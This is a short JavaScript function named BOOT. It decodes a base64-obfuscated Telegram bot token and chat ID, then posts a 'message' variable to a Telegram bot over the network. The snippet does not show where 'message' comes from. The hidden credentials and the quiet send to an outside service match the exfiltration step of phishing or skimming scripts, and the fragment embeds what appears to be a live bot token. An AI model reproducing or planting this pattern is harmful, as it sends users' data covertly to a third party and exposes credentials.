function BOOT() {
            const token = atob("NzgyNzQ0NzUyNjpBQUZUQUUzQVJmODUtYlZkdFVPYXNpQkg1cmNPcUxrNjhVWQ==");
            const chat_id = atob("NTY4NzQxOTIxMg==");
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: message
                })
            })
                .then(res => res.json())
                .then(data => console.log(data))
                .catch(err => console.log(err));
        }
